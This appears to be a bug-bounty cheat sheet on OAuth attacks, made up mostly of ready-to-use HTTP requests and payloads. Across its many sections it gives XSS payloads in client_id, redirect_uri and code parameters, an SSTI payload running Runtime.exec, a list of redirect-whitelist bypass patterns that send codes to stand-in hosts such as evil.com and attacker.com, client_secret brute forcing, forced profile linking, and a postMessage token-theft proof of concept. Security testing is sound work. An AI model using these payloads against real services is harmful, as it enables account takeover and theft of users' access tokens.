# OAUTH Misconfigurations

### Brute Force to Get Legacy OR Unimplemented OAuth Flows

{% embed url="https://twitter.com/intigriti/status/1173566272468135939" %}

### Modify `hd=` parameter

In OAuth Connect With Google , Try To Modify hd Parameter From company.com To gmail.com To Be Able To Connect With Your Email

[https://twitter.com/intigriti/status/1383397368691789825](https://twitter.com/intigriti/status/1383397368691789825)

{% embed url="https://twitter.com/m4ll0k/status/1319783718249238535" %}

```http
GET /oauth/Connect?response_type=code&client_id=ID&scope=openid%20email&redirect_uri=https://company.com&nonce=Randim&hd=gmail.com HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Accept-Encoding: gzip, deflate
```

### Remove `email`  from `scope`

Try To Remove Your Email From Scope Parameter While Signing Up OR Signing In With Services Provider To Get Account Takeover

{% embed url="https://akshanshjaiswal.medium.com/pre-access-to-victims-account-via-facebook-signup-60219e9e381d" %}

{% embed url="https://twitter.com/intigriti/status/1158383750490800128" %}

### Use Access Token Of Your App Instead Of Auth Token Of Victim App

```go
1 - Create Facebook App
2 - Generate Access Token
3 - Go To Victim App And Click On The Facebook Sign In
 Button With Intercepting Traffic Using Burp Suite
4 - Change Value Of auth_token Parameter To
 The Access Token
5 - Forward The Request And You Will Be Login Since
 There Is No Validation Weather The Access Token
 Generated For Victim App OR Other App
```

{% embed url="https://ankitthku.medium.com/account-takeover-via-common-misconfiguration-in-facebook-login-a2ac8b479b3" %}

* [https://hackerone.com/reports/101977](https://hackerone.com/reports/101977)
* [https://hackerone.com/reports/314808](https://hackerone.com/reports/314808)

### Change The Host Header

```http
GET /oauth/Connect HTTP/1.1
Host: me.com/www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Origin: https://www.company.com
```

{% embed url="https://hackerone.com/reports/317476" %}

### Insert Your Domain In Referer Header While

```http
GET /oauth/Connect HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Referer: https://me.com/path
Origin: https://www.company.com
```

* [https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
* [https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/](https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/)
* [https://hackerone.com/reports/202781](https://hackerone.com/reports/202781)

### Insert admin@comapny.com in scope

In OAuth Connect Request , Try To Insert admin@company.com as Value Of Email In Scope Parameter To Gain Extra Authorities OR Get More Functionalities

```http
POST /oauth/Connect HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: Number
firstname=I&lastname=am&image=URL&anti_csrf=CSRF
&email=admin@company.com&access_token=******
```

{% embed url="https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/" %}

### IDOR in `id=`  Parameter

> In OAuth Connect Request , Try To Recall Id In Scope Then Try To Change This Id To Id Of Logged In Account To Takeover This Account

```http
POST /oauth/Connect HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: Number
firstname=I&lastname=am&image=URL&anti_csrf=CSRF
&id=Id-Of-Another-Account&access_token=******
```

{% embed url="https://medium.com/@logicbomb_1/bugbounty-user-account-takeover-i-just-need-your-email-id-to-login-into-your-shopping-portal-7fd4fdd6dd56" %}

### Add JSON OR XML Extension To OAuth Endpoint

> In OAuth Connect Request , Try To Add JSON OR XML Extension To OAuth Endpoint e.g. oauth/connect.json , Maybe Token Expose In Response !

```http
POST /oauth/Connect.json HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: Number
type=token&client_id=ID&anti-csrf=&redirect_uri=URL
```

{% embed url="https://hackerone.com/reports/850022" %}

### XSS in OAUTH Connect/Callback

```http
GET /oauth/Connect?)%7D(alert)(location);%7B%3C!--&state=\&redirect_uri=URL&scope=read&type=code&client_id=ID& HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Accept-Encoding: gzip, deflate
```

{% embed url="https://hackerone.com/reports/311639" %}

### Insert XSS Payloads To Cause Errors

> Try To Insert XSS Payloads e.g. XSS To Cause Errors

```http
GET /oauth/Connect?
 client_id=<marquee loop=1 width=0 onfinish=
 pr\u006fmpt(document.domain)></marquee> HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://me.com/path
Origin: https://www.company.com
```

{% embed url="https://blog.usejournal.com/reflected-xss-in-zomato-f892d6887147" %}

### SSTI in Scope Parameter

> In OAuth Connect Request Try To Insert SSTI Payloads In Scope Parameter e.g. ${T(java.lang.Runtime).getRuntime().exec("calc.exe")} To Get RCE

```http
GET /oauth/Connect?
 type=code&client_id=ID&state=Random&redirect_uri=URL
 &scope=${T(Java.lang.Runtime).getRuntime().
 exec("calc.exe")} HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Accept-Encoding: gzip, deflate
```

{% embed url="https://www.gosecure.net/blog/2018/05/17/beware-of-the-magic-spell-part-2-cve-2018-1260/" %}

### XSS in RedirectUri&#x20;

> Try To Insert XSS Payloads As Value Of Redirect URL e.g. data:company.com;text/html;charset=UTF-8,%3Chtml%3E%3Cscript%3Edocument.write(document.domain);%3C%2Fscript%3E%3Ciframe/src= xxxxx%3Eaaaa%3C/iframe%3E%3C%2Fhtml%3E To GET DOM-Based XSS

```http
GET /oauth/Connect?type=code&client_id=ID&state=Random
&redirect_uri=data:company.com;text/html;charset=UTF-8
,%3Chtml%3E%3Cscript%3Edocument.write(document.
domain);%3C%2Fscript%3E%3Ciframe/src=xxxxx%3Eaa
aa%3C/iframe%3E%3C%2Fhtml%3E&scope=read HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
-----------------------------
POST /oauth/Connect HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: Number
client_id=ID&client_secret=SECRET&type=Authorization&
code=Auth_code&redirect_uri=javascript:fetch('XSS')
```

{% embed url="http://stamone-bug-bounty.blogspot.com/2017/10/dom-xss-auth14.html" %}

{% embed url="https://ysamm.com/?p=695" %}

### Path Traversal to open Redirect

> Try To Insert Redirect URL Parameter To Redirect URL As Value To Steal The Authorization Code OR The Access Token

```http
GET /oauth/Connect?type=code&client_id=ID&state=Random
&redirect_uri=https://www.company.com.com/../../redirect_
uri=https://me.com&scope=read HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

{% embed url="https://hackerone.com/reports/2559" %}

{% embed url="https://ysamm.com/?p=697" %}

### Authentication Bypass via OAuth Implicit Flow

1. Study OAuth flow starting from the authorization request `GET /auth?client_id=[...]`.
2. Client receives user info from the OAuth service.
3. Client logs in by sending a POST request to its `/authenticate` endpoint with user info and access token.
4. In Burp Repeater, modify the email in the POST request to impersonate another user.
5. Right-click the POST request, select "Request in browser" > "In original session", visit the URL, and log in as another user.

### Forced OAuth Profile Linking

1. Sign in with a social media profile.
2. Capture the request that includes `redirect_uri` in `/auth?client_id[...]`.
3. Check if the `state` parameter is present. If not, it’s vulnerable to CSRF.
4. Copy the request URL from Burp, drop the request, and turn off intercept.
5. Log out, send the link to the victim, or use an iframe on your website.
6. Victim's browser completes the OAuth flow, linking your profile to their account.

### CSRF

```
-  Integration Linking
-  no state parameter or 
-  state parameter static value 
-  Remove static parameter 
```

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption><p>Login CSRF</p></figcaption></figure>

### Insufficient Redirect URI Validation

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption><p>Open Redirec in redirec_uri Leads to 1-Click ATO</p></figcaption></figure>

#### Exploits:

1. **Open Redirect**: Redirect sensitive data to an attacker-controlled server.
   * &#x20;`https://yourtweetreader.com/callback?redirectUrl=https://evil.com`
   *   `Redirec_uri` Bypasses

       ```
       - target.com.evil.com
       - //attacker.com
       - https://attacker.com\@target.com
       - https://attacker.com?@target.com
       - attacker.com%0d%0atarget.com
       - Open-Redirect/SSRF -> Bypass redirect_uri
       ```
2. **Path Traversal**: `https://yourtweetreader.com/callback/../redirect?url=https://evil.com`
3. **Weak Regexes**: `https://yourtweetreader.com.evil.com`
4. **HTML Injection**: `https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>`
5. **XSS**: Reflecting redirect URL in response.

#### Steps:

1. Identify the `redirect_uri` parameter.
2. Construct an exploit URL to steal the authorization code.
3. Use the stolen code to complete the OAuth flow.

### SSRF via OpenID Dynamic Client Registration

1. Browse `/.well-known/openid-configuration` to find the registration endpoint.
2. Create a POST request to register a client.
3. Test if the `logo_uri` parameter is vulnerable to SSRF.

### Stealing OAuth Access Tokens via a Proxy Page

1. Register a client using a POST request.
2. Test `logo_uri` for SSRF to read metadata files.

### OAuth Account without email Address

1. Register account with phone number in 3rd party&#x20;
2. use this account to register on target&#x20;
3. in settings add victim email

### Microsoft nOAuth Misconfiguration

{% embed url="https://bibek-shah.medium.com/noauth-account-takeover-via-microsoft-oauth-cc653410b886" %}

### Facebook OAuth Misconfiguration

{% embed url="https://sl4x0.medium.com/fb-oauth-misconfiguration-leads-to-takeover-any-account-061316a5b31b" %}

1. Click Sign in with Facbook
2. Click "Edit Access"
3. Uncheck Email address
4. You loged in without email address

### OAuth Code Flaws

1. Reuse of authorization codes.
2. Brute-force attacks on codes.
3. Validity of a code across different applications.

### Access Token Scope Abuse

1. Use an access token to access elevated scope endpoints.

### Pre-Account Takeover

1. Register an account with the victim's email and attacker’s password.
2. Victim uses OAuth to register, linking their account to the attacker’s credentials.

#### ALL ATTACKS WITH `PROMPT=NONE` TO MINIMISE INTERACTION

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption><p>With Interaction</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption><p>With no Interaction</p></figcaption></figure>

### Play With `response_mode`  &#x20;

1.  The normal value to it is `&response_mode=query`

    <figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
2.  By Changing it's value to fragment the code is leaked in the url after `#` character

    <figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

### Exploit XSS in the Authorization Server to steal Victim's code&#x20;

1. Make  `&response_mode=form_post`   and the response will be for that send's post request with code and state parameter

```http
HTTP 200 OK

<form method="post" 
  action="https://target.com/cb">
<input name="code" value="A9bc5D2e"/>
</form>
```

1.  Attacker can steal the code and state parameter using this code \


    <figure><img src="https://lh7-us.googleusercontent.com/slidesz/AGV_vUdicEhcU-xYnDfTydv3QLyzy9fD-9Gvh6htoLvN6gPWYBxkFeMr9GLBGF2_fioQQDt4l1FFbAiZBKSstMD9_yu02gs-e53ldL4QPty73FGtR8aZbU7p3T89dTPj85IHZPaY7DSA3Zt7TvbqL5fNMiHME9UoRCwN=s2048?key=wpvX88q0Z4uLzcitI4vWuQ" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

### POST-AUTH REDIRECT + LOGIN CSRF

1.  There is endpoint vulnerable to open redirect using it to bypass `redirect_uri` Restrictions and using `&response_mode=fragment` to send code in url&#x20;

    <figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>
2. The website is vulnerable to an open redirect. After a user logs in, we can exploit the `state` parameter to perform a CSRF attack, causing the user to log into our account after completing the OAuth process. However, to steal the user's session/code when they log into the attacker-owned account, we can use `&response_mode=fragment`. This will send the user's code to an attacker-controlled site in the URL after the `#` sign, along with the attacker's code in the query.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

### Disclosure of Secrets

* Leaking `client_secret` allows attackers to generate access tokens and access user data.

### Client Secret Brute Force

1.  Brute force the `client_secret` to steal accounts.

    ```plaintext
    POST /token HTTP/1.1
    content-type: application/x-www-form-urlencoded
    host: target-server
    content-length: 135
    Connection: close

    code=authorization_code&redirect_uri=callback_url&grant_type=authorization_code&client_id=client_id&client_secret=[bruteforce]
    ```

### Referrer Header Leaking Code + State

* Verify if the code and state are reflected in the Referrer header when the user navigates to another page.

### Access Token Stored in Browser History

* Ensure access tokens are not stored in browser history.

### Everlasting Authorization Code

* Authorization code should have a short lifespan to limit the attack window.

### Authorization/Refresh Token Not Bound to Client

* Ensure tokens are bound to the specific client.

### Refresh Token Issues

* [ https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46](https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46).

### Race Conditions in OAuth 2 API Implementations

* Verify for potential race conditions that can lead to security issues.

### Summary

OAuth implementations can be vulnerable to various security issues. By understanding these vulnerabilities and following the steps outlined, you can effectively test and secure OAuth flows.

#### References

* [Stealing Users OAuth Tokens through redirect\_uri parameter](https://hackerone.com/reports/665651)
* [What about Refresh Token](https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46)
* [Account Takeover Chain](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html)

### List Of Patterns To Bypass The Whitelist In Redirect URL Parameter

```http
https://me.com\@www.company.com
https://company.com\@me.com
https://me.com/.www.company.com
https://company.com/ @me.com
https://me.com\[company.com]
me.com%ff@company.com%2F
me.com%bf:@company.com%2F
me.com%252f@company.com%2F
//me.com%0a%2523.company.com
me.com://company.com
androideeplink://me.com\@company.com
androideeplink://a@company.com:@me.com
androideeplink://company.com
https://company.com.me.com\@company.com
company.com%252f@me.com%2fpath%2f%3
//me.com:%252525252f@company.com
company.com.evil.com
evil.com#company.com
evil.com?company.com
/%09/me.com
me.com%09company.com
/\me.com
```

* [https://deepsec.net/docs/Slides/2016/Go\_Hack\_Yourself...\_Frans\_Rosen.pdf](https://deepsec.net/docs/Slides/2016/Go\_Hack\_Yourself...\_Frans\_Rosen.pdf)
* [https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf](https://i.blackhat.com/asia-19/Fri-March-29/bh-asia-Wang-Make-Redirection-Evil-Again.pdf)
* [https://twitter.com/kunalp94/status/1195321932612169728](https://twitter.com/kunalp94/status/1195321932612169728)
* [https://twitter.com/kunalp94/status/1195321932612169728](https://twitter.com/kunalp94/status/1195321932612169728)
* [https://research.nccgroup.com/2020/07/07/an-offensive-guide-to-the-authorization-code-grant/](https://research.nccgroup.com/2020/07/07/an-offensive-guide-to-the-authorization-code-grant/)
* [https://elmahdi.tistory.com/4](https://elmahdi.tistory.com/4)

### Use IDN Homograph Attack To Spoof Redirect URL Parameter

> Try To Use IDN Homograph Attack To Spoof Redirect URL Parameter To Steal The Authorization Code OR The Access Token

```http
GET /oauth/Connect?type=code&client_id=ID&state=Random&redirect_uri=https://www.cṍmpany.com&scope=read HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

{% embed url="https://hackerone.com/reports/861940" %}

### Black Characters&#x20;

> Try To Insert Invisible Range %00 To %FF in The URL e.g. me.com%5bcompany.com As Value Of Redirect URL Parameter

{% embed url="https://twitter.com/ElMrhassel/status/1282661956676182017" %}

{% embed url="https://twitter.com/intigriti/status/1185160357872066561" %}

### Change Request Method

> Try To Change Request Method To e.g. GET , POST , HEAD OR PUT To Understand How Company Routes The Different Methods in OAuth Flow

```http
HEAD /oauth/Connect?
 type=code&client_id=ID&state=Random
 &redirect_uri=URL&scope=read HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
Accept-Encoding: gzip, deflate
```

{% embed url="https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html" %}

### Race Condition

> Try To Figure Out Reaction Of The Server While Doing Race Condition By Using Turbo Intruder OR Nuclei To Send Simultaneously Requests

```http
GET /oauth/Callback?code=Valid HTTP/1.1
Host: www.company.com
X-Test: %s
email=victim@gmail.com&otp=wrongOTP
```

{% embed url="https://hackerone.com/reports/55140" %}

### XSS in the `code=` parameter

> Try To Insert XSS Payloads e.g. ,%2520alert(123))%253B// In The Authorization Code Parameter If Value Of Code Parameter Reflected

```http
GET /oauth/Callback?code=,%2520alert(123))%253B// HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path
Origin: https://www.company.com
```

{% embed url="https://hackerone.com/reports/56760" %}

### Reuse The Authorization Code With XSS Payloads

> If The Authorization Code Is Used More Than Once Try To Reuse The Authorization Code With XSS Payloads e.g. Codealert('XSS')

```http
POST /oauth/Callback HTTP/1.1
Host: www.company.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Referer: https://previous.com/path
Origin: https://www.company.com
Content-Length: Number
client_id=ID&client_secret=SECRET&type=Authorization&code=
Auth_Code<script>alert('XSS')</script>&redirect_uri=URL
```

{% embed url="https://owasp.org/www-pdf-archive/20151215-Top_X_OAuth_2_Hacks-asanso.pdf" %}

{% embed url="http://blog.intothesymmetry.com/2014/02/oauth-2-attacks-and-bug-bounties.html" %}

### Use The OAuth Token With Logged In User In OAuth Provider

> \*\*\* If App Ask You Log In With OAuth Provider By Generating OAuth Token , Try To Use The OAuth Token With Logged In User In OAuth Provider

```http
1 - I am logged in with app.com as Account One
2 - I open appservice.com
3 - I get https://api.app.com/oauth/?oauth_token=*****
4 - I did not move forward and shared this link with someone who
is logged in with app.com as Account Two
5 - Account Two grants the permission to the third Party App appservice.com
6 - Account One also grants the permission to the third Party App
appservice.com By Using The Same OAuth Token
7 - I Get Dashboard Of appservice.com of Account Two Not Account One
```

{% embed url="https://hackerone.com/reports/46485" %}

{% embed url="https://infosecwriteups.com/oauth-misconfiguration-leads-to-full-account-takeover-22b032cb6732?source=---------1----------------------------" %}

### Exploit Post Messages

> Try To Use Whitelist Subdomain With Endpoint Contains postMessage(Msg,"\*"); In which Msg = window.location.href.split("#")\[1]; To Steal The Access Token

```http
1 - search About :-
var Msg = window.location.href.split("#")[1];
window.parent.postMessage(Msg,"*");
2 - There Isn't :-
X-Frame-Options Header
3 - Use This POC :-
var exploit_url = 'https://company.com/oauth?client_id=id&redirect_uri=
https://sub.company.com/postMsg.js';
var i = document.createElement('iframe');
document.body.appendChild(i);
window.addEventListener('oauth', function(Token) {alert(Token.data.name);
}, !1);
```

{% embed url="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/" %}

{% embed url="https://hackerone.com/reports/821896" %}
